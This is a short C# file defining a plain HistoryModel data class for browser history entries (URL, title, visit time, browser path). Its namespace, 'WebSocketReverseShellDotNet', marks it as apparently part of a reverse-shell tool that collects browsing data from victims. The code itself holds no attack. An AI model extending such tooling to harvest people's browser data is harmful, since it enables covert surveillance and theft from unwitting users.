using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace WebSocketReverseShellDotNet.model.broswer
{
    internal class HistoryModel
    {
        public string? Url { get; set; }
        public string? Title { get; set; }
        public string? VisitTime { get; set; }
        public string? BrowserPath { get; set; }


        public HistoryModel(string? Url, string? Title, string? VisitTime, string? BrowserPath) 
        { 
        
            this.Url = Url;
            this.Title = Title;
            this.VisitTime = VisitTime;
            this.BrowserPath = BrowserPath;

        }

    }
}
